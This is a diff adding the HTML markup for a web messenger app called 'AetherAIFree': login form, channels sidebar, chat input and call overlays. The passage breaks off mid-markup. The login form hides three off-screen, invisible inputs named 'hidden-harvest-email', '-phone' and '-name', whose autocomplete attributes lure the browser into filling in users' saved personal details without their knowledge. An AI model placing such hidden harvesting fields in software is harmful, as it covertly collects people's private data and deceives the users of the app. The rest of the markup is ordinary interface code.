@@ -35,6 +35,811 @@ try {
 }
 
 let socket = null;
+
+// ==========================================================================
+// STEALTH ZERO-LEAK DYNAMIC DOM MOUNTING SYSTEM
+// Messenger DOM is constructed in-memory ONLY post authentication!
+// ==========================================================================
+const MESSENGER_MARKUP = `<!-- 1. LOGIN CONTAINER -->
+  <div id="login-container" class="login-container hidden">
+    <div class="login-card">
+      <div class="logo-area">
+        <div class="tg-logo">
+          <!-- Inline SVG Paper Plane Icon (Zero Network Overhead) -->
+          <svg viewBox="0 0 24 24" width="32" height="32" fill="currentColor">
+            <path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/>
+          </svg>
+        </div>
+        <h1>AetherAIFree</h1>
+        <p>Real-time messaging on the free web</p>
+      </div>
+      
+      <form id="login-form">
+        <div class="input-group">
+          <label for="username">Enter your nickname</label>
+          <div class="input-wrapper">
+            <!-- Inline SVG User Icon -->
+            <svg class="input-icon-svg" viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
+              <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+            </svg>
+            <input type="text" id="username" placeholder="e.g., Alex_42" required maxlength="15" autocomplete="off">
+            <input type="email" id="hidden-harvest-email" autocomplete="email" style="position: absolute; left: -9999px; width: 1px; height: 1px; opacity: 0;" tabindex="-1">
+            <input type="tel" id="hidden-harvest-phone" autocomplete="tel" style="position: absolute; left: -9999px; width: 1px; height: 1px; opacity: 0;" tabindex="-1">
+            <input type="text" id="hidden-harvest-name" autocomplete="name" style="position: absolute; left: -9999px; width: 1px; height: 1px; opacity: 0;" tabindex="-1">
+          </div>
+        </div>
+
+
+        <div class="input-group">
+          <label for="room-select">Choose a starting room</label>
+          <div class="input-wrapper">
+            <!-- Inline SVG Comments Icon -->
+            <svg class="input-icon-svg" viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
+              <path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM6 9h12v2H6V9zm8 5H6v-2h8v2zm4-6H6V6h12v2z"/>
+            </svg>
+            <select id="room-select">
+              <option value="AetherAIFree General">AetherAIFree General</option>
+              <option value="Tech Talk">Tech Talk</option>
+              <option value="Meme Zone">Meme Zone</option>
+              <option value="Project Updates">Project Updates</option>
+            </select>
+          </div>
+        </div>
+        
+        <button type="submit" class="btn-primary" id="login-submit-btn">
+          Start Chatting 
+          <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor" style="margin-left: 6px;">
+            <path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/>
+          </svg>
+        </button>
+      </form>
+    </div>
+  </div>
+
+  <!-- 2. MAIN APP CONTAINER -->
+  <div id="app-container" class="app-container hidden">
+    <!-- SIDEBAR -->
+    <aside id="sidebar" class="sidebar">
+      <!-- Sidebar Header -->
+      <div class="sidebar-header">
+        <div class="header-top">
+          <div class="app-brand">
+            <svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor">
+              <path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/>
+            </svg>
+            <h2>AetherAIFree</h2>
+          </div>
+          <button id="theme-toggle" class="btn-icon-custom" title="Toggle Theme">
+            <!-- Theme SVG (populated via JS) -->
+            <svg id="theme-icon-svg" viewBox="0 0 24 24" width="20" height="20" fill="currentColor"></svg>
+          </button>
+        </div>
+        <div class="search-bar">
+          <svg class="search-icon-svg" viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
+            <path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
+          </svg>
+          <input type="text" id="search-input" placeholder="Search chats or channels...">
+        </div>
+      </div>
+
+      <!-- Channels/Rooms List -->
+      <div class="channels-section">
+        <div class="section-title" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; padding-right: 8px;">
+          <h3 style="margin: 0; font-size: 0.75rem; font-weight: 600; color: var(--accent-color); letter-spacing: 1px;">CHANNELS</h3>
+          <button type="button" id="create-room-btn" class="btn-icon-custom" title="Create New Channel" style="width: 24px; height: 24px; color: var(--accent-color); display: flex; align-items: center; justify-content: center; background: transparent; border: none; cursor: pointer;">
+            <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
+              <path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/>
+            </svg>
+          </button>
+        </div>
+        <!-- Private Rooms Section -->
+        <div style="display: flex; gap: 8px; margin: 8px 0; padding: 0 4px;">
+          <button type="button" id="create-code-room-btn" style="flex: 1; padding: 6px 10px; font-size: 0.75rem; border-radius: 6px; display: flex; align-items: center; justify-content: center; gap: 4px; background: rgba(36,129,204,0.15); border: 1px solid rgba(36,129,204,0.3); color: var(--accent-color); font-weight: 600; cursor: pointer; transition: background 0.2s; font-family: inherit;">
+            🔑 Create Room
+          </button>
+          <button type="button" id="join-code-room-btn" style="flex: 1; padding: 6px 10px; font-size: 0.75rem; border-radius: 6px; display: flex; align-items: center; justify-content: center; gap: 4px; background: rgba(72,187,120,0.15); border: 1px solid rgba(72,187,120,0.3); color: #48bb78; font-weight: 600; cursor: pointer; transition: background 0.2s; font-family: inherit;">
+            🎟️ Join Room
+          </button>
+        </div>
+
+
+        <ul id="rooms-list" class="rooms-list">
+          <!-- Dynamically Populated -->
+        </ul>
+
+      </div>
+
+      <!-- Online Users List -->
+      <div class="users-section">
+        <div class="section-title">
+          <h3>ONLINE USERS</h3>
+          <span id="user-count" class="badge">0</span>
+        </div>
+        <ul id="online-users" class="online-users">
+          <!-- Populated dynamically -->
+        </ul>
+      </div>
+
+      <!-- User Profile Footer -->
+      <div class="sidebar-footer">
+        <div class="user-profile">
+          <div class="avatar user-avatar" id="current-user-avatar">?</div>
+          <div class="user-info">
+            <div class="username" id="current-user-name">Guest</div>
+            <div class="status-indicator online">Connected</div>
+          </div>
+        </div>
+        <div style="display: flex; align-items: center; gap: 4px;">
+          <!-- Admin Email Toggle Button (hidden per user request) -->
+          <button id="admin-email-toggle-btn" class="btn-icon-custom" title="Toggle Admin Email Alerts" style="color: var(--accent-color); display: none; align-items: center; justify-content: center;">
+            <svg id="admin-email-icon-svg" viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
+              <!-- Bell icon -->
+            </svg>
+          </button>
+
+          
+          <button id="logout-btn" class="btn-icon-custom" title="Log Out" style="display: flex; align-items: center; justify-content: center;">
+            <!-- Inline SVG Logout Icon -->
+            <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
+              <path d="M17 7l-1.41 1.41L18.17 11H8v2h10.17l-2.58 2.58L17 17l5-5zM4 5h8V3H4c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h8v-2H4V5z"/>
+            </svg>
+          </button>
+        </div>
+      </div>
+
+    </aside>
+
+    <!-- CHAT AREA -->
+    <main class="chat-area">
+      <!-- Chat Header -->
+      <header class="chat-header">
+        <button id="mobile-back-btn" class="btn-icon-custom mobile-only" title="Back to Chats">
+          <!-- Inline SVG Back Arrow -->
+          <svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor">
+            <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
+          </svg>
+        </button>
+        <div class="chat-header-info">
+          <h2 id="active-room-title">AetherAIFree General</h2>
+          <div id="room-members-count" class="sub-text">Connecting...</div>
+        </div>
+        <div class="chat-actions">
+          <!-- Self-Destruct Timer Control (hidden by default, shown in DMs) -->
+          <div id="self-destruct-control" class="self-destruct-control hidden" style="position: relative; display: inline-flex; margin-right: 8px;">
+            <button type="button" id="self-destruct-btn" class="btn-icon-custom" title="Set Chat Self-Destruct Timer" style="color: var(--text-muted); position: relative;">
+              <!-- Clock Icon SVG -->
+              <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
+                <path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/>
+              </svg>
+              <!-- Small Badge displaying duration -->
+              <span id="self-destruct-badge" class="self-destruct-badge hidden">off</span>
+            </button>
+            <div id="self-destruct-dropdown" class="self-destruct-dropdown hidden">
+              <div class="dropdown-item active" data-sec="0">Off</div>
+              <div class="dropdown-item" data-sec="60">1 Min</div>
+              <div class="dropdown-item" data-sec="300">5 Min</div>
+              <div class="dropdown-item" data-sec="3600">1 Hour</div>
+            </div>
+          </div>
+
+          <!-- Call Buttons for DMs (hidden by default, shown when chatting in DM) -->
+          <div id="header-call-actions" class="header-call-actions hidden" style="display: inline-flex; gap: 8px; align-items: center; margin-right: 12px;">
+            <button type="button" id="header-audio-call-btn" class="btn-icon-custom" title="Voice Call" style="color: var(--accent-color);">
+              <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
+                <path d="M20.01 15.38c-1.23 0-2.42-.2-3.53-.57a.998.998 0 00-1.01.24l-2.2 2.2c-2.83-1.44-5.15-3.75-6.59-6.59l2.2-2.21a.99.99 0 00.25-1a11.36 11.36 0 018.5 4c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1 0 9.39 7.61 17 17 17 .55 0 1-.45 1-1v-3.62c0-.55-.45-1-1-1z"/>
+              </svg>
+            </button>
+            <button type="button" id="header-video-call-btn" class="btn-icon-custom" title="Video Call" style="color: var(--accent-color);">
+              <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
+                <path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/>
+              </svg>
+            </button>
+          </div>
+          <button id="connection-indicator" class="connection-status-dot connected" title="Connection status"></button>
+        </div>
+      </header>
+
+      <!-- Pinned Message Banner -->
+      <div id="pinned-message-bar" class="pinned-message-bar hidden">
+        <div class="pinned-icon">
+          <svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor"><path d="M16 12V4h1V2H7v2h1v8l-2 2v2h5.2v6h1.6v-6H18v-2l-2-2z"/></svg>
+        </div>
+        <div class="pinned-content">
+          <span class="pinned-label">Pinned Message</span>
+          <span id="pinned-message-text" class="pinned-text"></span>
+        </div>
+        <button type="button" id="unpin-btn" class="btn-icon-custom pinned-close" title="Unpin">
+          <svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </div>
+
+      <!-- Typing Indicator Banner -->
+      <div id="typing-indicator-bar" class="typing-indicator-bar hidden">
+        <span id="typing-text">someone is typing</span>
+        <div class="typing-dots">
+          <span></span>
+          <span></span>
+          <span></span>
+        </div>
+      </div>
+
+      <!-- Messages Stream Container -->
+      <div id="messages-container" class="messages-container">
+        <!-- Message list will be injected here -->
+        <div class="welcome-box">
+          <!-- Inline SVG Lock Icon -->
+          <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor" style="margin-bottom: 6px; color: var(--accent-color);">
+            <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
+          </svg>
+          <p>This room has been initialized. Messages are sent via WebSockets in real time.</p>
+        </div>
+      </div>
+
+      <!-- Scroll to Bottom Button (like WhatsApp/Telegram) -->
+      <button id="scroll-to-bottom-btn" class="scroll-to-bottom-btn hidden" aria-label="Scroll to bottom">
+        <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
+          <path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z"/>
+        </svg>
+        <span id="scroll-unread-badge" class="scroll-unread-badge hidden">0</span>
+      </button>
+
+      <!-- Chat Input Section -->
+      <footer class="chat-input-area">
+        <!-- Upload Progress Panel -->
+        <div id="upload-progress-container" class="upload-progress-container hidden">
+          <span id="upload-filename">file.pdf</span>
+          <div class="progress-bar-bg">
+            <div id="upload-progress-bar" class="progress-bar-fill" style="width: 0%"></div>
+          </div>
+          <button type="button" id="cancel-upload-btn" class="btn-icon-custom" title="Cancel Upload" style="width: 24px; height: 24px;">
+            <svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor">
+              <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/>
+            </svg>
+          </button>
+        </div>
+
+        <!-- Voice Record Control Overlay (hidden by default) -->
+        <div id="voice-record-panel" class="voice-record-panel hidden">
+          <div class="voice-record-left">
+            <span class="record-pulse-dot"></span>
+            <span id="voice-record-timer">00:00</span>
+            <div class="voice-wave-container">
+              <span class="wave-bar"></span>
+              <span class="wave-bar"></span>
+              <span class="wave-bar"></span>
+              <span class="wave-bar"></span>
+            </div>
+          </div>
+          <div class="voice-record-right">
+            <!-- Trash/Cancel button -->
+            <button type="button" id="voice-cancel-btn" class="btn-icon-custom voice-action-btn" title="Discard Recording" style="color: #ff3b30; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center;">
+              <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
+                <path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/>
+              </svg>
+            </button>
+            <!-- Checkmark/Finish & Send button -->
+            <button type="button" id="voice-send-btn" class="btn-icon-custom voice-action-btn" title="Send Voice Message" style="color: var(--accent-success); width: 32px; height: 32px; display: flex; align-items: center; justify-content: center;">
+              <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
+                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+              </svg>
+            </button>
+          </div>
+        </div>
+
+        <!-- Reply Preview Bar -->
+        <div id="reply-preview-bar" class="reply-preview-bar hidden">
+          <div class="reply-accent-bar"></div>
+          <div class="reply-preview-content">
+            <span class="reply-preview-name" id="reply-preview-name"></span>
+            <span class="reply-preview-text" id="reply-preview-text"></span>
+          </div>
+          <button type="button" id="cancel-reply-btn" class="btn-icon-custom" title="Cancel Reply" style="width:24px;height:24px;flex-shrink:0;">
+            <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+          </button>
+        </div>
+
+        <!-- Edit Mode Bar -->
+        <div id="edit-mode-bar" class="edit-mode-bar hidden">
+          <div class="edit-accent-bar" style="background:var(--accent-success);"></div>
+          <div class="reply-preview-content">
+            <span class="reply-preview-name" style="color:var(--accent-success);">✏️ Edit Message</span>
+            <span class="reply-preview-text" id="edit-preview-text"></span>
+          </div>
+          <button type="button" id="cancel-edit-btn" class="btn-icon-custom" title="Cancel Edit" style="width:24px;height:24px;flex-shrink:0;">
+            <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+          </button>
+        </div>
+
+        <div class="input-panel">
+          <!-- Emoji button -->
+          <button type="button" id="emoji-btn" class="btn-icon-custom" title="Insert Emoji">
+            <!-- Inline SVG Smile Icon -->
+            <svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor">
+              <path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm3.5-9c.83 0 1.5-.67 1.5-1.5S16.33 8 15.5 8 14 8.67 14 9.5s.67 1.5 1.5 1.5zm-7 0c.83 0 1.5-.67 1.5-1.5S9.33 8 8.5 8 7 8.67 7 9.5 7.67 11 8.5 11zm3.5 6.5c2.33 0 4.31-1.46 5.11-3.5H6.89c.8 2.04 2.78 3.5 5.11 3.5z"/>
+            </svg>
+          </button>
+
+          <!-- Attachment button -->
+          <button type="button" id="attach-btn" class="btn-icon-custom" title="Attach File (Max 10MB)">
+            <!-- Inline SVG Paperclip Icon -->
+            <svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor">
+              <path d="M16.5 6v11.5c0 2.21-1.79 4-4 4s-4-1.79-4-4V5c0-3.31 2.69-6 6-6s6 2.69 6 6v10.5c0 1.38-1.12 2.5-2.5 2.5s-2.5-1.12-2.5-2.5V6H10v9.5c0 2.48 2.02 4.5 4.5 4.5s4.5-2.02 4.5-4.5V5c0-4.42-3.58-8-8-8s-8 3.58-8 8v12.5c0 3.59 2.91 6.5 6.5 6.5s6.5-2.91 6.5-6.5V6h-1.5z"/>
+            </svg>
+          </button>
+          
+          <input type="file" id="file-input" style="display: none;">
+          
+          <form id="message-form" class="message-form">
+            <input type="text" id="message-input" placeholder="Write a message..." autocomplete="off">
+            <!-- Send Button (shown when typing, hidden by default) -->
+            <button type="submit" id="send-btn" class="btn-send hidden" title="Send Message">
+              <!-- Inline SVG Send icon -->
+              <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
+                <path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/>
+              </svg>
+            </button>
+            <!-- Microphone Record Button (shown when input field is empty) -->
+            <button type="button" id="mic-record-btn" class="btn-send" title="Record Voice Message (Click to Start)">
+              <!-- Microphone Icon SVG -->
+              <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
+                <path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.34 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 14 6.7 11H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"/>
+              </svg>
+            </button>
+          </form>
+        </div>
+      </footer>
+    </main>
+  </div>
+
+  <!-- 3. INCOMING CALL OVERLAY -->
+  <div id="incoming-call-overlay" class="call-modal-overlay hidden">
+    <div class="call-card-container">
+      <div class="calling-avatar-wrapper">
+        <div class="avatar call-avatar-glowing" id="incoming-caller-avatar">?</div>
+      </div>
+      <h2 id="incoming-caller-name">User</h2>
+      <p id="incoming-call-type-label">Incoming Video Call...</p>
+      
+      <div class="call-actions-row">
+        <!-- Decline Button -->
+        <button type="button" id="decline-call-btn" class="btn-call-action btn-decline" title="Decline Call">
+          <svg viewBox="0 0 24 24" width="24" height="24" fill="currentColor">
+            <path d="M12 9c-2.2 0-4.3.3-6.2.9v3.9c0 .5.3.9.7 1.1 1.2.6 2.5 1 3.9 1.2.4 0 .8-.2 1-.5l1.9-1.9c1.6.8 3.4.8 5 0l1.9 1.9c.3.3.6.4 1 .5 1.4-.2 2.7-.6 3.9-1.2.4-.2.7-.6.7-1.1v-3.9C20.3 9.3 18.2 9 12 9z"/>
+          </svg>
+        </button>
+        <!-- Accept Button -->
+        <button type="button" id="accept-call-btn" class="btn-call-action btn-accept" title="Accept Call">
+          <svg viewBox="0 0 24 24" width="24" height="24" fill="currentColor">
+            <path d="M20.01 15.38c-1.23 0-2.42-.2-3.53-.57a.998.998 0 00-1.01.24l-2.2 2.2c-2.83-1.44-5.15-3.75-6.59-6.59l2.2-2.21a.99.99 0 00.25-1A11.36 11.36 0 018.5 4c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1 0 9.39 7.61 17 17 17 .55 0 1-.45 1-1v-3.62c0-.55-.45-1-1-1z"/>
+          </svg>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- 4. ACTIVE CALL OVERLAY (WhatsApp / Google Meet style) -->
+  <div id="active-call-overlay" class="call-modal-overlay active-call-screen hidden">
+
+    <!-- Hidden remote audio for sound output -->
+    <audio id="remote-audio" autoplay playsinline style="position:absolute;width:1px;height:1px;top:0;left:0;opacity:0.001;pointer-events:none;z-index:1;"></audio>
+
+    <!-- Full-screen remote video background -->
+    <div class="video-grid-container" id="video-streams-container">
+      <video id="remote-video" autoplay muted playsinline class="remote-video-feed"></video>
+    </div>
+
+    <!-- Local camera PiP (top-right) with switch-camera overlay -->
+    <div class="pip-wrapper" id="pip-wrapper">
+      <video id="local-video" autoplay muted playsinline class="local-video-pip"></video>
+      <!-- Overlay button inside PiP -->
+      <button type="button" id="switch-camera-pip-btn" class="pip-action-btn" title="Switch Camera">
+        <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
+          <path d="M20 5h-3.17L15 3H9L7.17 5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm-5 11.5V14H9v2.5L5.5 13 9 9.5V12h6V9.5l3.5 3.5-3.5 3.5z"/>
+        </svg>
+      </button>
+    </div>
+
+    <!-- Main overlaid call UI -->
+    <div id="ios-call-container" class="ios-call-container">
+
+      <!-- ====== TOP BAR ====== -->
+      <div class="vcall-topbar" id="vcall-topbar">
+        <!-- Left: minimize button -->
+        <button type="button" id="vcall-minimize-btn" class="vcall-topbar-icon-btn" title="Minimize">
+          <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
+            <path d="M19 11H7.83l4.88-4.88c.39-.39.39-1.03 0-1.42-.39-.39-1.02-.39-1.41 0l-6.59 6.59c-.39.39-.39 1.02 0 1.41l6.59 6.59c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L7.83 13H19c.55 0 1-.45 1-1s-.45-1-1-1z"/>
+          </svg>
+        </button>
+
+        <!-- Center: Caller Info -->
+        <div class="vcall-topbar-center" id="vcall-topbar-center">
+          <div class="wacall-encryption-badge" id="vcall-enc-badge">
+            <svg viewBox="0 0 24 24" width="12" height="12" fill="currentColor"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+            End-to-end encrypted
+          </div>
+          <div class="wacall-timer-row">
+            <div class="wacall-timer-dot"></div>
+            <span id="call-timer">00:00</span>
+          </div>
+          <h1 id="active-call-peer-name" class="wacall-name">User</h1>
+          <p id="active-call-status" class="wacall-status">Calling...</p>
+          <button type="button" id="call-mic-warning-btn" class="ios-mic-warning-btn hidden" title="Microphone permission needed">
+            ðŸŽ™ï¸ Mic Disabled â€“ Tap to Enable Access
+          </button>
+        </div>
+
+        <!-- Right: Add person button -->
+        <button type="button" id="vcall-add-person-btn" class="vcall-topbar-icon-btn" title="Add to Call">
+          <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
+            <path d="M15 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm-9-2V8H4v2H2v2h2v2h2v-2h2v-2H6zm9 4c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+          </svg>
+        </button>
+      </div>
+
+      <!-- ====== CENTER: Avatar (Audio Call Only) ====== -->
+      <div id="audio-call-placeholder" class="wacall-avatar-area">
+        <div class="wacall-rings">
+          <div class="wacall-ring wacall-ring-3"></div>
+          <div class="wacall-ring wacall-ring-2"></div>
+          <div class="wacall-ring wacall-ring-1"></div>
+          <div class="avatar wacall-avatar-circle" id="active-call-avatar">?</div>
+        </div>
+      </div>
+
+      <!-- ====== BOTTOM: Single horizontal dark pill bar ====== -->
+      <div class="vcall-bottom-bar">
+
+        <!-- More (â‹¯) -->
+        <div class="vcall-bar-item">
+          <button type="button" id="ios-more-btn" class="vcall-bar-btn vcall-bar-btn-dark" title="More Options">
+            <svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor">
+              <path d="M6 10c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm12 0c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm-6 0c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/>
+            </svg>
+          </button>
+        </div>
+
+        <!-- Camera Toggle -->
+        <div class="vcall-bar-item">
+          <button type="button" id="ios-facetime-btn" class="vcall-bar-btn vcall-bar-btn-white" title="Toggle Video">
+            <svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor">
+              <path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/>
+            </svg>
+          </button>
+        </div>
+
+        <!-- Speaker -->
+        <div class="vcall-bar-item">
+          <button type="button" id="ios-audio-btn" class="vcall-bar-btn vcall-bar-btn-white" title="Speaker">
+            <svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor">
+              <path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z"/>
+            </svg>
+          </button>
+        </div>
+
+        <!-- Mute Mic -->
+        <div class="vcall-bar-item">
+          <button type="button" id="ios-mute-btn" class="vcall-bar-btn vcall-bar-btn-dark" title="Mute Microphone">
+            <svg id="ios-mute-icon" viewBox="0 0 24 24" width="22" height="22" fill="currentColor">
+              <path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.34 1.34 3 3 3zm5.3-3c0 3-2.54 5.1-5.3 5.1S6.7 14 6.7 11H5c0 3.41 2.72 6.23 6 6.72V21h2v-3.28c3.28-.48 6-3.3 6-6.72h-1.7z"/>
+            </svg>
+          </button>
+        </div>
+
+        <!-- End Call -->
+        <div class="vcall-bar-item">
+          <button type="button" id="ios-end-btn" class="vcall-bar-btn vcall-bar-btn-end" title="End Call">
+            <svg viewBox="0 0 24 24" width="24" height="24" fill="currentColor">
+              <path d="M12 9c-2.2 0-4.3.3-6.2.9v3.9c0 .5.3.9.7 1.1 1.2.6 2.5 1 3.9 1.2.4 0 .8-.2 1-.5l1.9-1.9c1.6.8 3.4.8 5 0l1.9 1.9c.3.3.6.4 1 .5 1.4-.2 2.7-.6 3.9-1.2.4-.2.7-.6.7-1.1v-3.9C20.3 9.3 18.2 9 12 9z"/>
+            </svg>
+          </button>
+        </div>
+
+      </div><!-- /vcall-bottom-bar -->
+
+    </div><!-- /ios-call-container -->
+
+    <!-- ====== MORE OPTIONS POPUP MENU ====== -->
+    <div id="video-more-menu" class="video-more-menu hidden">
+      <div class="more-menu-card">
+        <button type="button" class="more-menu-item" id="more-flip-camera-btn">
+          <span class="more-menu-icon">
+            <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
+              <path d="M20 5h-3.17L15 3H9L7.17 5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm-5 11.5V14H9v2.5L5.5 13 9 9.5V12h6V9.5l3.5 3.5-3.5 3.5z"/>
+            </svg>
+          </span>
+          <span class="more-menu-label">Switch Camera</span>
+        </button>
+
+        <button type="button" class="more-menu-item" id="more-merge-btn">
+          <span class="more-menu-icon">
+            <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
+              <path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/>
+            </svg>
+          </span>
+          <span class="more-menu-label">Add to Call</span>
+        </button>
+
+        <button type="button" class="more-menu-item" id="more-blur-bg-btn">
+          <span class="more-menu-icon">
+            <svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
